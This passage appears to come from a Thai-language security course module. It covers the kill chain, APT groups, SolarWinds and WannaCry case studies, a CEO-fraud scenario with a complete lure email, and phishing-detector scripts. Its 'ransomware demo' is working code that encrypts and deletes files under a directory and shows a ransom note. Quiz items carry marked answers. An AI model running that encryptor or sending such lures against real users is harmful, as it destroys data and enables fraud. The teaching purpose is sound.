+│  1. RECONNAISSANCE                                     │
+│     └─> Identify targets                               │
+│     └─> Gather information                             │
+│     └─> Find vulnerabilities                           │
+│              │                                         │
+│              ▼                                         │
+│  2. WEAPONIZATION                                      │
+│     └─> Create malware                                 │
+│     └─> Prepare exploit                                │
+│     └─> Combine with delivery mechanism                │
+│              │                                         │
+│              ▼                                         │
+│  3. DELIVERY                                           │
+│     └─> Spear phishing                                 │
+│     └─> Watering hole                                  │
+│     └─> USB/Physical media                             │
+│              │                                         │
+│              ▼                                         │
+│  4. EXPLOITATION                                       │
+│     └─> Trigger vulnerability                          │
+│     └─> Execute malware                                │
+│     └─> Gain initial access                            │
+│              │                                         │
+│              ▼                                         │
+│  5. INSTALLATION                                       │
+│     └─> Install backdoor                               │
+│     └─> Establish persistence                          │
+│     └─> Create multiple entry points                   │
+│              │                                         │
+│              ▼                                         │
+│  6. COMMAND & CONTROL (C2)                             │
+│     └─> Establish C2 channel                           │
+│     └─> Receive instructions                           │
+│     └─> Avoid detection                                │
+│              │                                         │
+│              ▼                                         │
+│  7. ACTIONS ON OBJECTIVES                              │
+│     └─> Data exfiltration                              │
+│     └─> System manipulation                            │
+│     └─> Lateral movement                               │
+│                                                        │
+└────────────────────────────────────────────────────────┘
+```
+
+### ตัวอย่าง APT Groups ที่มีชื่อเสียง
+
+```
+TOP APT GROUPS
+
+┌─────────────┬──────────────┬────────────────────┬─────────────┐
+│ APT Group   │ Origin       │ Primary Targets    │ Known For   │
+├─────────────┼──────────────┼────────────────────┼─────────────┤
+│ APT29       │ Russia       │ Government, Energy │ SolarWinds  │
+│ (Cozy Bear) │              │ Defense sectors    │ attack      │
+├─────────────┼──────────────┼────────────────────┼─────────────┤
+│ APT28       │ Russia       │ Military, Media    │ DNC hack    │
+│ (Fancy Bear)│              │ Political orgs     │ Olympics    │
+├─────────────┼──────────────┼────────────────────┼─────────────┤
+│ APT1        │ China        │ IP theft           │ 141         │
+│ (Comment    │              │ Manufacturing      │ companies   │
+│  Crew)      │              │ Technology         │ compromised │
+├─────────────┼──────────────┼────────────────────┼─────────────┤
+│ Lazarus     │ North Korea  │ Financial, Crypto  │ Sony hack   │
+│ Group       │              │ Cryptocurrency     │ WannaCry    │
+├─────────────┼──────────────┼────────────────────┼─────────────┤
+│ APT41       │ China        │ Gaming, Healthcare │ Dual use    │
+│             │              │ Telecoms           │ espionage & │
+│             │              │                    │ crime       │
+└─────────────┴──────────────┴────────────────────┴─────────────┘
+```
+
+### Case Study: APT29 และ SolarWinds Attack (2020)
+
+#### ภาพรวม
+การโจมตีที่ซับซ้อนที่สุดรายการหนึ่งในประวัติศาสตร์
+
+**Timeline:**
+```
+2019 September
+├─> APT29 compromises SolarWinds build system
+│
+2020 March
+├─> Malicious update distributed
+│   (Orion Platform version 2019.4 - 2020.2.1)
+│
+2020 December 13
+├─> FireEye discovers breach
+│
+2020 December 31
+├─> 18,000+ organizations affected
+    └─> Including US Government agencies
+        • Treasury
+        • Commerce
+        • Homeland Security
+        • State Department
+```
+
+#### Attack Mechanism
+```
+┌──────────────────────────────────────────────┐
+│        SOLARWINDS SUPPLY CHAIN ATTACK        │
+├──────────────────────────────────────────────┤
+│                                              │
+│  [1] APT29 compromises SolarWinds            │
+│      build environment                       │
+│              │                               │
+│              ▼                               │
+│  [2] Injects malicious code into             │
+│      Orion platform updates                  │
+│              │                               │
+│              ▼                               │
+│  [3] Digitally signed backdoor               │
+│      (SUNBURST) distributed                  │
+│              │                               │
+│              ▼                               │
+│  [4] 18,000+ customers download              │
+│      "legitimate" update                     │
+│              │                               │
+│              ▼                               │
+│  [5] Backdoor activates after 14 days        │
+│      (dormancy period)                       │
+│              │                               │
+│              ▼                               │
+│  [6] C2 communication established            │
+│      (using legitimate domains)              │
+│              │                               │
+│              ▼                               │
+│  [7] Lateral movement & data theft           │
+│      in selected high-value targets          │
+│                                              │
+└──────────────────────────────────────────────┘
+```
+
+#### Lessons Learned
+```
+🔍 Key Takeaways:
+
+1. Supply Chain Risk
+   └─> Even trusted vendors can be compromised
+
+2. Advanced Techniques
+   └─> Signed malware bypasses security
+   └─> Long dormancy period avoids detection
+   └─> Uses legitimate domains for C2
+
+3. Detection Challenges
+   └─> Behaves like legitimate traffic
+   └─> Selective targeting (< 100 organizations actually exploited)
+
+4. Impact Scale
+   └─> Single compromise → Thousands affected
+   └─> Government, Fortune 500 breached
+```
+
+---
+
+## 📚 <a name="case-studies"></a>Case Studies
+
+### Case Study 1: WannaCry Ransomware (May 2017)
+
+#### เหตุการณ์
+```
+════════════════════════════════════════════
+ WANNACRY RANSOMWARE ATTACK - MAY 12, 2017
+════════════════════════════════════════════
+
+Attack Vector: EternalBlue (MS17-010)
+Malware Type: Ransomware Worm
+Impact: 200,000+ computers in 150+ countries
+Ransom: $300-600 in Bitcoin
+```
+
+#### Technical Details
+```python
+# WannaCry ใช้ช่องโหว่ EternalBlue ใน SMB protocol
+
+class WannaCrySimulator:
+    """
+    จำลองพฤติกรรมของ WannaCry
+    Educational demonstration only
+    """
+    
+    def __init__(self):
+        self.infected_hosts = []
+        self.kill_switch_domain = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
+    
+    def check_kill_switch(self):
+        """WannaCry ตรวจสอบ kill switch domain"""
+        try:
+            # ถ้า domain นี้ resolve ได้ = หยุดการแพร่กระจาย
+            import socket
+            socket.gethostbyname(self.kill_switch_domain)
+            print("[SIMULATION] Kill switch activated! Stopping propagation.")
+            return True
+        except:
+            print("[SIMULATION] Kill switch not found. Continue spreading.")
+            return False
+    
+    def scan_smb_vulnerability(self):
+        """สแกนหา SMBv1 vulnerability (MS17-010)"""
+        print("[SIMULATION] Scanning network for SMB vulnerability...")
+        # ในความเป็นจริง: ใช้ EternalBlue exploit
+        vulnerable_hosts = [
+            "192.168.1.10",  # Windows 7 (unpatched)
+            "192.168.1.20",  # Windows XP
+        ]
+        return vulnerable_hosts
+    
+    def exploit_and_spread(self, target):
+        """ใช้ exploit และแพร่กระจาย"""
+        print(f"[SIMULATION] Exploiting {target}...")
+        print(f"[SIMULATION] Copying ransomware to {target}...")
+        print(f"[SIMULATION] Executing ransomware on {target}...")
+        self.infected_hosts.append(target)
+    
+    def encrypt_files(self):
+        """เข้ารหัสไฟล์"""
+        print("[SIMULATION] Encrypting files...")
+        file_extensions = ['.doc', '.xls', '.pdf', '.jpg', '.png', '.zip']
+        print(f"[SIMULATION] Target extensions: {file_extensions}")
+    
+    def display_ransom_screen(self):
+        """แสดงหน้าจอเรียกค่าไถ่"""
+        ransom_note = """
+╔════════════════════════════════════════════════╗
+║              Ooops, your files have            ║
+║              been encrypted!                   ║
+╠════════════════════════════════════════════════╣
+║                                                ║
+║  What happened to my computer?                 ║
+║  Your important files are encrypted.           ║
+║                                                ║
+║  Can I recover my files?                       ║
+║  Sure. We guarantee that you can recover all   ║
+║  your files safely and easily.                 ║
+║                                                ║
+║  How do I pay?                                 ║
+║  Payment is accepted in Bitcoin only.          ║
+║                                                ║
+║  • Send $300 worth of Bitcoin to:              ║
+║    13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb4           ║
+║                                                ║
+║  Time remaining: 03 : 23 : 45 : 12             ║
+║                                                ║
+╚════════════════════════════════════════════════╝
+        """
+        print(ransom_note)
+
+# Demonstration
+if __name__ == "__main__":
+    print("=== WannaCry Attack Simulation ===\n")
+    
+    wannacry = WannaCrySimulator()
+    
+    # Step 1: Check kill switch
+    if not wannacry.check_kill_switch():
+        # Step 2: Scan for vulnerable hosts
+        targets = wannacry.scan_smb_vulnerability()
+        
+        # Step 3: Exploit and spread
+        for target in targets:
+            wannacry.exploit_and_spread(target)
+        
+        # Step 4: Encrypt files
+        wannacry.encrypt_files()
+        
+        # Step 5: Display ransom screen
+        wannacry.display_ransom_screen()
+```
+
+#### Impact Analysis
+```
+WANNACRY IMPACT BY SECTOR
+
+Healthcare (NHS)     ████████████████████ 40%
+Manufacturing        █████████████        25%
+Government           ██████████           20%
+Education            ████                 10%
+Others               ██                    5%
+
+Total Financial Loss: ~$4 Billion USD
+
+Notable Victims:
+• UK National Health Service (NHS)
+  - 19,494 appointments cancelled
+  - 5 accident & emergency departments diverted
+  
+• Renault (France)
+  - Production halted at multiple plants
+  
+• FedEx (USA)
+  - Worldwide operations disrupted
+  
+• Telefónica (Spain)
+  - Employees sent home
+```
+
+#### Prevention & Response
+```
+🛡️ PREVENTION MEASURES
+
+1. Patch Management
+   └─> Apply MS17-010 patch immediately
+   └─> Enable automatic updates
+
+2. Network Segmentation
+   └─> Isolate critical systems
+   └─> Limit SMB access
+
+3. Backup Strategy
+   └─> Regular offline backups
+   └─> Test restore procedures
+
+4. Disable SMBv1
+   └─> PowerShell: Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
+   └─> Registry: Set SMB1 = 0
+
+5. Security Monitoring
+   └─> Monitor for suspicious SMB traffic
+   └─> Alert on mass file encryption
+```
+
+---
+
+### Case Study 2: Phishing Campaign - CEO Fraud
+
+#### Scenario
+```
+════════════════════════════════════════
+ BUSINESS EMAIL COMPROMISE (BEC)
+════════════════════════════════════════
+
+Company: Tech Startup (50 employees)
+Target: Finance Manager
+Attacker Goal: Wire transfer fraud
+Loss: $250,000 USD
+```
+
+#### Attack Flow
+```
+Phase 1: RECONNAISSANCE (Week 1-2)
+├─> LinkedIn: Identify CEO, Finance Manager
+├─> Company website: Learn about structure
+├─> Social media: CEO's travel schedule
+└─> Email format: firstname.lastname@company.com
+
+Phase 2: PREPARATION (Week 3)
+├─> Register similar domain: companny.com (typo)
+├─> Setup email: ceo@companny.com
+├─> Create fake email signature
+└─> Wait for CEO's business trip (from social media)
+
+Phase 3: ATTACK (Week 4 - Monday 9 AM)
+From: CEO John Smith <ceo@companny.com>
+To: Finance Manager <finance@company.com>
+
+Subject: Urgent: Confidential Acquisition
+
+Hi Sarah,
+
+I'm in a meeting with potential acquisition target.
+We need to transfer funds urgently as a deposit.
+
+Details:
+Amount: $250,000
+To: ABC Consulting LLC
+Account: 9876543210
+Bank: International Business Bank
+SWIFT: INTLUS33
+
+This is confidential - please don't discuss with
+anyone yet. Board approval pending.
+
+Can you process this within 2 hours?
+
+Best,
+John
+
+Sent from my iPhone
+
+Phase 4: SUCCESS (2 hours later)
+└─> Finance Manager processes transfer
+└─> Money sent to attacker's account
+└─> Funds immediately moved to multiple accounts
+└─> Real CEO returns: "What transfer?"
+```
+
+#### Red Flags นึ่ง Finance Manager พลาด
+```
+🚩 MISSED WARNING SIGNS
+
+1. Email Domain
+   └─> companny.com vs company.com (typo)
+
+2. Unusual Request
+   └─> Large transfer without proper approval
+   └─> New vendor (ABC Consulting)
+
+3. Urgency Tactics
+   └─> "Process within 2 hours"
+   └─> "Don't discuss with anyone"
+
+4. Communication Channel
+   └─> Email instead of normal approval process
+   └─> "Sent from iPhone" (convenience excuse)
+
+5. Timing
+   └─> Monday morning (less careful)
+   └─> CEO traveling (can't verify easily)
+```
+
+#### Python Script - Email Domain Checker
+```python
+import difflib
+from urllib.parse import urlparse
+
+class PhishingDetector:
+    """
+    เครื่องมือตรวจสอบ phishing email
+    """
+    
+    def __init__(self, legitimate_domains):
+        self.legitimate_domains = legitimate_domains
+    
+    def check_domain_similarity(self, suspicious_email):
+        """ตรวจสอบ domain ที่คล้ายกัน"""
+        # Extract domain from email
+        if '@' in suspicious_email:
+            domain = suspicious_email.split('@')[1].lower()
+        else:
+            domain = suspicious_email.lower()
+        
+        print(f"\n🔍 Checking domain: {domain}")
+        
+        # Check exact match
+        if domain in self.legitimate_domains:
+            print(f"✅ Domain is legitimate")
+            return True
+        
+        # Check for similar domains (typosquatting)
+        for legit_domain in self.legitimate_domains:
+            similarity = difflib.SequenceMatcher(
+                None, domain, legit_domain
+            ).ratio()
+            
+            if similarity > 0.8:  # 80% similar
+                print(f"⚠️  WARNING: Very similar to legitimate domain!")
+                print(f"   Suspicious: {domain}")
+                print(f"   Legitimate: {legit_domain}")
+                print(f"   Similarity: {similarity:.2%}")
+                
+                # Common typosquatting techniques
+                self.detect_typosquatting(domain, legit_domain)
+                return False
+        
+        print(f"❌ Domain not recognized")
+        return False
+    
+    def detect_typosquatting(self, suspicious, legitimate):
+        """ตรวจจับเทคนิค typosquatting"""
+        print(f"\n🎯 Typosquatting Analysis:")
+        
+        # Character substitution
+        if self.has_char_substitution(suspicious, legitimate):
+            print("   • Character substitution detected")
+        
+        # Missing character
+        if len(suspicious) == len(legitimate) - 1:
+            print("   • Missing character detected")
+        
+        # Extra character
+        if len(suspicious) == len(legitimate) + 1:
+            print("   • Extra character detected")
+        
+        # Homograph attack (look-alike characters)
+        homograph_chars = {
+            'o': '0', 'l': '1', 'i': '1',
+            'rn': 'm', 'vv': 'w'
+        }
+        for real, fake in homograph_chars.items():
+            if fake in suspicious and real in legitimate:
+                print(f"   • Homograph: '{fake}' looks like '{real}'")
+    
+    def has_char_substitution(self, s1, s2):
+        """ตรวจสอบการแทนที่ตัวอักษร"""
+        if len(s1) != len(s2):
+            return False
+        
+        differences = sum(1 for a, b in zip(s1, s2) if a != b)
+        return differences == 1
+    
+    def check_email_headers(self, email_data):
+        """ตรวจสอบ email headers"""
+        print("\n📧 Email Header Analysis:")
+        
+        # Check SPF
+        if 'SPF' in email_data:
+            if email_data['SPF'] == 'PASS':
+                print("   ✅ SPF check: PASS")
+            else:
+                print("   ⚠️  SPF check: FAIL")
+        
+        # Check DKIM
+        if 'DKIM' in email_data:
+            if email_data['DKIM'] == 'PASS':
+                print("   ✅ DKIM signature: Valid")
+            else:
+                print("   ⚠️  DKIM signature: Invalid")
+        
+        # Check DMARC
+        if 'DMARC' in email_data:
+            if email_data['DMARC'] == 'PASS':
+                print("   ✅ DMARC: PASS")
+            else:
+                print("   ⚠️  DMARC: FAIL")
+    
+    def analyze_content(self, email_content):
+        """วิเคราะห์เนื้อหา email"""
+        print("\n📝 Content Analysis:")
+        
+        # Urgency indicators
+        urgency_keywords = [
+            'urgent', 'immediately', 'asap', 'right now',
+            'within 24 hours', 'act now', 'limited time'
+        ]
+        
+        found_urgency = [
+            kw for kw in urgency_keywords 
+            if kw in email_content.lower()
+        ]
+        
+        if found_urgency:
+            print(f"   ⚠️  Urgency tactics detected: {found_urgency}")
+        
+        # Secrecy indicators
+        secrecy_keywords = [
+            'confidential', 'don\'t tell', 'keep secret',
+            'don\'t discuss', 'private matter'
+        ]
+        
+        found_secrecy = [
+            kw for kw in secrecy_keywords
+            if kw in email_content.lower()
+        ]
+        
+        if found_secrecy:
+            print(f"   ⚠️  Secrecy tactics detected: {found_secrecy}")
+        
+        # Money/payment requests
+        money_keywords = [
+            'wire transfer', 'payment', 'invoice', 'bank account',
+            'credit card', 'bitcoin', 'cryptocurrency'
+        ]
+        
+        found_money = [
+            kw for kw in money_keywords
+            if kw in email_content.lower()
+        ]
+        
+        if found_money:
+            print(f"   ⚠️  Financial request detected: {found_money}")
+
+# Demo
+if __name__ == "__main__":
+    print("=== Phishing Email Detector ===\n")
+    
+    # Initialize with legitimate domains
+    detector = PhishingDetector([
+        'company.com',
+        'paypal.com',
+        'google.com'
+    ])
+    
+    # Test suspicious emails
+    test_emails = [
+        'ceo@companny.com',      # Typosquatting
+        'security@paypa1.com',   # Homograph (l → 1)
+        'admin@company.com',     # Legitimate
+        'support@g00gle.com'     # Homograph (o → 0)
+    ]
+    
+    for email in test_emails:
+        detector.check_domain_similarity(email)
+        print("-" * 50)
+    
+    # Analyze email content
+    phishing_content = """
+    Subject: Urgent: Wire Transfer Required
+    
+    Hi Sarah,
+    
+    I need you to process this wire transfer immediately.
+    This is confidential - don't discuss with anyone.
+    
+    Amount: $250,000
+    Account: 123456789
+    
+    Best,
+    CEO
+    """
+    
+    detector.analyze_content(phishing_content)
+```
+
+---
+
+## 🔬 <a name="demonstrations"></a>Hands-on Demonstrations
+
+### Demo 1: Malware Behavior Analysis (Safe Environment)
+
+#### Setup
+```bash
+# สร้าง VM สำหรับ malware analysis
+# ใช้ VirtualBox + Ubuntu/Windows VM
+# สำคัญ: ต้อง isolate network!
+
+# Ubuntu Setup
+sudo apt-get update
+sudo apt-get install python3 python3-pip
+pip3 install pycryptodome
+
+# Windows Setup
+# - Download Python from python.org
+# - Install in VM only
+# - Disable network adapter
+```
+
+#### Demo Script: File Encryption Simulation
+```python
+#!/usr/bin/env python3
+"""
+Ransomware Behavior Demonstration
+สำหรับการศึกษาเท่านั้น - ใช้ใน isolated VM
+"""
+
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import os
+import json
+
+class RansomwareDemo:
+    def __init__(self):
+        self.key = get_random_bytes(32)  # AES-256 key
+        self.files_encrypted = []
+    
+    def encrypt_file(self, filepath):
+        """เข้ารหัสไฟล์เดียว"""
+        print(f"[*] Encrypting: {filepath}")
+        
+        try:
+            # อ่านไฟล์ต้นฉบับ
+            with open(filepath, 'rb') as f:
+                data = f.read()
+            
+            # เข้ารหัสด้วย AES-256-CTR
+            cipher = AES.new(self.key, AES.MODE_CTR)
+            encrypted_data = cipher.encrypt(data)
+            
+            # บันทึกข้อมูลที่เข้ารหัส
+            encrypted_file = filepath + '.encrypted'
+            with open(encrypted_file, 'wb') as f:
+                # บันทึก nonce (ต้องใช้ในการถอดรหัส)
+                f.write(cipher.nonce)
+                f.write(encrypted_data)
+            
+            # ลบไฟล์ต้นฉบับ
+            os.remove(filepath)
+            
+            self.files_encrypted.append(encrypted_file)
+            print(f"[+] Encrypted successfully: {encrypted_file}")
+            
+        except Exception as e:
+            print(f"[!] Error encrypting {filepath}: {e}")
+    
+    def decrypt_file(self, filepath, key):
+        """ถอดรหัสไฟล์"""
+        print(f"[*] Decrypting: {filepath}")
+        
+        try:
+            with open(filepath, 'rb') as f:
+                # อ่าน nonce (16 bytes แรก)
+                nonce = f.read(16)
+                encrypted_data = f.read()
+            
+            # ถอดรหัส
+            cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
+            decrypted_data = cipher.decrypt(encrypted_data)
+            
+            # บันทึกไฟล์ที่ถอดรหัสแล้ว
+            original_file = filepath.replace('.encrypted', '')
+            with open(original_file, 'wb') as f:
+                f.write(decrypted_data)
+            
+            # ลบไฟล์ที่เข้ารหัส
+            os.remove(filepath)
+            
+            print(f"[+] Decrypted successfully: {original_file}")
+            
+        except Exception as e:
+            print(f"[!] Error decrypting {filepath}: {e}")
+    
+    def scan_and_encrypt(self, directory, extensions=None):
+        """สแกนและเข้ารหัสไฟล์ตามชนิดที่กำหนด"""
+        if extensions is None:
+            extensions = ['.txt', '.pdf', '.doc', '.jpg']
+        
+        print(f"\n[*] Scanning directory: {directory}")
+        print(f"[*] Target extensions: {extensions}")
+        
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                filepath = os.path.join(root, file)
+                _, ext = os.path.splitext(file)
+                
+                if ext.lower() in extensions:
+                    self.encrypt_file(filepath)
+    
+    def save_decryption_key(self, filepath='decryption_key.bin'):
+        """บันทึก decryption key"""
+        with open(filepath, 'wb') as f:
+            f.write(self.key)
+        print(f"\n[*] Decryption key saved to: {filepath}")
+    
+    def load_decryption_key(self, filepath='decryption_key.bin'):
+        """โหลด decryption key"""
+        with open(filepath, 'rb') as f:
+            return f.read()
+
+def create_test_files(directory='./test_files'):
+    """สร้างไฟล์ทดสอบ"""
+    os.makedirs(directory, exist_ok=True)
+    
+    test_files = {
+        'document1.txt': 'This is a test document.',
+        'photo1.jpg': b'\xff\xd8\xff\xe0',  # JPEG header
+        'report.pdf': b'%PDF-1.4',  # PDF header
+    }
+    
+    for filename, content in test_files.items():
+        filepath = os.path.join(directory, filename)
+        mode = 'w' if isinstance(content, str) else 'wb'
+        with open(filepath, mode) as f:
+            f.write(content)
+    
+    print(f"[+] Created test files in: {directory}")
+
+def main():
+    """Demo การทำงานของ ransomware"""
+    print("=" * 60)
+    print("  RANSOMWARE BEHAVIOR DEMONSTRATION")
+    print("  Educational Purpose Only - Use in Isolated VM!")
+    print("=" * 60)
+    
+    # สร้างไฟล์ทดสอบ
+    test_dir = './test_files'
+    create_test_files(test_dir)
+    
+    # สร้าง ransomware demo
+    ransomware = RansomwareDemo()
+    
+    # Phase 1: Encryption
+    print("\n" + "=" * 60)
+    print("PHASE 1: FILE ENCRYPTION")
+    print("=" * 60)
+    ransomware.scan_and_encrypt(test_dir)
+    
+    # บันทึก key (ในความเป็นจริง attacker จะเก็บไว้)
+    ransomware.save_decryption_key()
+    
+    # Phase 2: แสดง ransom note
+    print("\n" * 2)
+    ransom_note = """
+╔═════════════════════════════════════════════════╗
+║           YOUR FILES HAVE BEEN ENCRYPTED        ║
+╠═════════════════════════════════════════════════╣
+║                                                 ║
+║  Files encrypted: {count}                       ║
+║                                                 ║
+║  To decrypt your files:                         ║
+║  1. Pay 0.5 BTC to: [Bitcoin Address]           ║
+║  2. Email transaction ID to: unlock@evil.com    ║
+║  3. Receive decryption key within 1 hour        ║
+║                                                 ║
+║  WARNING: Do not restart your computer!         ║
+║           Do not try to decrypt files yourself! ║
+║           You have 72 hours before key is       ║
+║           destroyed permanently!                ║
+║                                                 ║
+╚═════════════════════════════════════════════════╝
+    """.format(count=len(ransomware.files_encrypted))
+    print(ransom_note)
+    
+    # Phase 3: Decryption (เมื่อได้ key)
+    input("\nPress Enter to simulate payment and decryption...")
+    
+    print("\n" + "=" * 60)
+    print("PHASE 2: FILE DECRYPTION (After Payment)")
+    print("=" * 60)
+    
+    # โหลด key
+    key = ransomware.load_decryption_key()
+    
+    # ถอดรหัสไฟล์ทั้งหมด
+    for encrypted_file in ransomware.files_encrypted:
+        if os.path.exists(encrypted_file):
+            ransomware.decrypt_file(encrypted_file, key)
+    
+    print("\n[+] All files decrypted!")
+    print("[+] Demo completed.")
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+### Demo 2: Phishing Email Analysis
+
+#### Interactive Demo Script
+```python
+#!/usr/bin/env python3
+"""
+Phishing Email Analysis Tool
+เครื่องมือวิเคราะห์ phishing email
+"""
+
+import re
+from urllib.parse import urlparse
+import hashlib
+
+class PhishingAnalyzer:
+    def __init__(self):
+        self.suspicious_keywords = {
+            'urgency': [
+                'urgent', 'immediate action', 'act now',
+                'expires today', 'limited time', 'hurry'
+            ],
+            'threats': [
+                'account suspended', 'account closed',
+                'unusual activity', 'verify immediately',
+                'unauthorized access'
+            ],
+            'rewards': [
+                'congratulations', 'you won', 'claim prize',
+                'free gift', 'exclusive offer'
+            ]
+        }
+        
+        self.legitimate_domains = [
+            'paypal.com', 'google.com', 'facebook.com',
+            'microsoft.com', 'apple.com'
+        ]
+    
+    def analyze_email(self, email_data):
+        """วิเคราะห์ email ทั้งหมด"""
+        print("\n" + "=" * 60)
+        print("PHISHING EMAIL ANALYSIS")
+        print("=" * 60)
+        
+        score = 0
+        max_score = 0
+        
+        # 1. วิเคราะห์ sender
+        print("\n[1] SENDER ANALYSIS")
+        sender_score, sender_max = self.analyze_sender(
+            email_data['from']
+        )
+        score += sender_score
+        max_score += sender_max
+        
+        # 2. วิเคราะห์ subject
+        print("\n[2] SUBJECT LINE ANALYSIS")
+        subject_score, subject_max = self.analyze_subject(
+            email_data['subject']
+        )
+        score += subject_score
+        max_score += subject_max
+        
+        # 3. วิเคราะห์เนื้อหา
+        print("\n[3] CONTENT ANALYSIS")
+        content_score, content_max = self.analyze_content(
+            email_data['body']
+        )
+        score += content_score
+        max_score += content_max
+        
+        # 4. วิเคราะห์ links
+        print("\n[4] LINK ANALYSIS")
+        link_score, link_max = self.analyze_links(
+            email_data['body']
+        )
+        score += link_score
+        max_score += link_max
+        
+        # 5. แสดงผลสรุป
+        self.display_summary(score, max_score)
+    
+    def analyze_sender(self, sender):
+        """วิเคราะห์ sender email"""
+        score = 0
+        max_score = 30
+        
+        print(f"   Sender: {sender}")
+        
+        # ตรวจสอบ domain
+        if '@' in sender:
+            domain = sender.split('@')[1].lower()
+            print(f"   Domain: {domain}")
+            
+            # ตรวจสอบความคล้ายกับ legitimate domains
+            for legit_domain in self.legitimate_domains:
+                if domain == legit_domain:
+                    print(f"   ✅ Matches legitimate domain")
+                    break
+                elif self.similarity(domain, legit_domain) > 0.8:
+                    print(f"   ⚠️  Similar to {legit_domain} (possible typosquatting)")
+                    score += 15
+        else:
+            print("   ❌ Invalid email format")
+            score += 20
+        
+        return score, max_score
+    
+    def analyze_subject(self, subject):
+        """วิเคราะห์ subject line"""
+        score = 0
+        max_score = 20
+        
+        print(f"   Subject: {subject}")
+        
+        # ตรวจสอบ urgency keywords
+        for category, keywords in self.suspicious_keywords.items():
+            found = [kw for kw in keywords if kw in subject.lower()]
+            if found:
+                print(f"   ⚠️  {category.upper()} keywords: {found}")
+                score += 10
+        
+        # ตรวจสอบ ALL CAPS
+        if subject.isupper():
+            print("   ⚠️  All caps (aggressive)")
+            score += 5
+        
+        # ตรวจสอบ excessive punctuation
+        if subject.count('!') > 2:
+            print("   ⚠️  Excessive exclamation marks")
+            score += 5
+        
+        return score, max_score
+    
+    def analyze_content(self, body):
+        """วิเคราะห์เนื้อหา email"""
+        score = 0
+        max_score = 30
+        
+        # ตรวจสอบ suspicious keywords
+        for category, keywords in self.suspicious_keywords.items():
+            found = [kw for kw in keywords if kw in body.lower()]
+            if found:
+                print(f"   ⚠️  {category.upper()}: {found[:3]}")  # แสดง 3 อันแรก
+                score += 10
+        
+        # ตรวจสอบ spelling errors
+        common_errors = ['recieve', 'occured', 'seperate', 'definately']
+        found_errors = [err for err in common_errors if err in body.lower()]
+        if found_errors:
+            print(f"   ⚠️  Spelling errors: {found_errors}")
+            score += 10
+        
+        # ตรวจสอบ request for personal info
+        personal_info = [
+            'password', 'social security', 'credit card',
+            'bank account', 'pin code', 'verification code'
+        ]
+        found_info = [info for info in personal_info if info in body.lower()]
+        if found_info:
+            print(f"   ⚠️  Requests personal info: {found_info}")
+            score += 15
+        
+        return score, max_score
+    
+    def analyze_links(self, body):
+        """วิเคราะห์ links ใน email"""
+        score = 0
+        max_score = 20
+        
+        # หา URLs ทั้งหมด
+        url_pattern = r'https?://[^\s<>"]+'
+        urls = re.findall(url_pattern, body)
+        
+        if urls:
+            print(f"   Found {len(urls)} link(s):")
+            
+            for url in urls:
+                parsed = urlparse(url)
+                print(f"\n   URL: {url}")
+                print(f"   Domain: {parsed.netloc}")
+                
+                # ตรวจสอบ IP address instead of domain
+                if re.match(r'\d+\.\d+\.\d+\.\d+', parsed.netloc):
+                    print("   ⚠️  Uses IP address (suspicious)")
+                    score += 10
+                
+                # ตรวจสอบ URL shortener
+                shorteners = ['bit.ly', 'tinyurl.com', 't.co', 'goo.gl']
+                if any(short in parsed.netloc for short in shorteners):
+                    print("   ⚠️  URL shortener (hides real destination)")
+                    score += 5
+                
+                # ตรวจสอบ suspicious TLD
+                suspicious_tlds = ['.tk', '.ml', '.ga', '.cf', '.gq']
+                if any(parsed.netloc.endswith(tld) for tld in suspicious_tlds):
+                    print("   ⚠️  Suspicious TLD")
+                    score += 10
+        
+        return score, max_score
+    
+    def similarity(self, s1, s2):
+        """คำนวณความคล้ายของ string"""
+        from difflib import SequenceMatcher
+        return SequenceMatcher(None, s1, s2).ratio()
+    
+    def display_summary(self, score, max_score):
+        """แสดงผลสรุป"""
+        print("\n" + "=" * 60)
+        print("ANALYSIS SUMMARY")
+        print("=" * 60)
+        
+        percentage = (score / max_score) * 100
+        
+        print(f"\nPhishing Score: {score}/{max_score} ({percentage:.1f}%)")
+        
+        if percentage >= 70:
+            risk_level = "🔴 HIGH RISK - Likely Phishing"
+            recommendation = "DO NOT respond, click links, or provide information!"
+        elif percentage >= 40:
+            risk_level = "🟡 MEDIUM RISK - Suspicious"
+            recommendation = "Verify sender through official channels before responding."
+        else:
+            risk_level = "🟢 LOW RISK - Appears Legitimate"
+            recommendation = "Still verify sender if unexpected or requests sensitive info."
+        
+        print(f"\nRisk Level: {risk_level}")
+        print(f"Recommendation: {recommendation}")
+        print("\n" + "=" * 60)
+
+# Sample phishing emails for demonstration
+sample_emails = [
+    {
+        'name': 'PayPal Phishing',
+        'from': 'security@paypa1.com',
+        'subject': 'URGENT! Account Suspended - Verify Now!',
+        'body': '''
+Dear Customer,
+
+We have detected unusual activity on your PayPal account.
+Your account has been SUSPENDED for security reasons.
+
+Click here immediately to verify your identity:
+http://192.168.1.100/paypal-verify.php
+
+You have 24 hours or your account will be closed permanently!
+Please provide your password and social security number to verify.
+
+Regards,
+PayPal Security Team
+'''
+    },
+    {
+        'name': 'Legitimate Email',
+        'from': 'support@company.com',
+        'subject': 'Monthly Newsletter - January 2024',
+        'body': '''
+Hi there,
+
+Here's our monthly update with new features and improvements.
+
+• New dashboard design
+• Performance improvements
+• Bug fixes
+
+Visit our website: https://company.com/updates
+
+Best regards,
+Company Team
+'''
+    }
+]
+
+def main():
+    """Demo การวิเคราะห์ phishing email"""
+    analyzer = PhishingAnalyzer()
+    
+    for i, email in enumerate(sample_emails, 1):
+        print(f"\n\n{'=' * 60}")
+        print(f"DEMO {i}: {email['name']}")
+        print('=' * 60)
+        
+        analyzer.analyze_email(email)
+        
+        if i < len(sample_emails):
+            input("\nPress Enter to continue to next email...")
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 📝 <a name="exercises"></a>แบบฝึกหัดและคำถามชวนคิด
+
+### คำถามทบทวน (Multiple Choice)
+
+#### ข้อ 1: Malware Classification
+```
+Virus และ Worm ต่างกันอย่างไร?
+
+A) Virus แพร่กระจายเร็วกว่า Worm
+B) Worm ต้องมี host file แต่ Virus ไม่ต้อง
+C) Virus ต้องการ user action แต่ Worm แพร่กระจายอัตโนมัติ  ✓
+D) Worm ทำลายไฟล์ แต่ Virus ไม่ทำลาย
+
+คำอธิบาย:
